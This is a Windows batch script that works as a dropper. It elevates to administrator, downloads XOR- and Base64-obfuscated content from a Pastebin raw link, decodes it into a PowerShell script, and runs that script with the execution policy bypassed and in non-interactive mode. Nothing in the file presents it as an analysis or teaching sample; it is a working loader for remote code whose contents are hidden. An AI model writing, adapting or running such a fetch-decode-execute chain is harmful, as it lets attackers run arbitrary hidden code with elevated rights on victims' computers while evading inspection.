@echo off
:: Ensure admin privileges
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    set params=%*
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Generate timestamp for unique filenames
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set "timestamp=%datetime:~0,4%-%datetime:~4,2%-%datetime:~6,2%_%datetime:~8,2%-%datetime:~10,2%-%datetime:~12,2%"

:: Download the XOR-encoded Base64 content from Pastebin
powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/rHP8Sda2' -OutFile $env:TEMP\rb_%timestamp%.ps1"
if %errorlevel% NEQ 0 (
    exit /B
)
:: Decode and decrypt the script
powershell -Command "$content = Get-Content $env:TEMP\rb_%timestamp%.ps1 -Raw; $deXorBytes = [Convert]::FromBase64String($content) | ForEach-Object { $_ -bxor 101 }; $deXorBase64 = [System.Text.Encoding]::UTF8.GetString($deXorBytes); $decodedCommand = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($deXorBase64)); $decodedCommand | Set-Content $env:TEMP\decrypted_%timestamp%.ps1"

if %errorlevel% NEQ 0 (
    pause
    exit /B
)

:: Print the decrypted content
type "%TEMP%\decrypted_%timestamp%.ps1"

:: Execute the decrypted script
powershell -NoP -NonI -Ep Bypass -File "%TEMP%\decrypted_%timestamp%.ps1"
if %errorlevel% NEQ 0 (
    pause
    exit /B
)

exit